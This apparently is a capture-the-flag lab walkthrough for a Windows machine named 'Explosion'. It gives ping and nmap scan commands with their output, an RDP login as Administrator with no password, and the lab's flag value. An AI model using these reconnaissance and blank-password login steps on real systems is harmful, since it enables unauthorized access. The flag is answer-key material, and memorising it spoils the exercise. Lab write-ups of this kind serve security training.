![Meow.png](/assets/Tier-0/Meow/meow.jpg)

1. Send an ICMP echo request to machine's IP address.
```bash
┌──(kali㉿kali)-[~]
└─$ ping -c 1 10.129.88.32
```



2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.129.88.32
```

**Output**
```bash
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
```

3. Search versions and scripts to scanning ports
```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─| nmap -sCV -p135,139,445,3389,5985,47001 10.129.88.32 
```

**Output**
```bash
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: EXPLOSION
|   NetBIOS_Domain_Name: EXPLOSION
|   NetBIOS_Computer_Name: EXPLOSION
|   DNS_Domain_Name: Explosion
|   DNS_Computer_Name: Explosion
|   Product_Version: 10.0.17763
|_  System_Time: 2022-11-18T15:18:22+00:00
|_ssl-date: 2022-11-18T15:18:29+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=Explosion
| Not valid before: 2022-11-17T15:15:14
|_Not valid after:  2023-05-19T15:15:14
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```


4. In port **3389** rdp service is runningm you can connect how `Administrator` without **password**

```bash
┌──(root㉿kali)-[/home/kali/Desktop]
└─| xfreerdp /u:Administrator /v:10.129.88.32
```

**Output**

![rdp.PNG](/assets/Tier-0/Explosion/rdp.PNG)

5. Open **flag file**

```txt
Flag: 951fa96d7830c451b536be5a6be008a0
```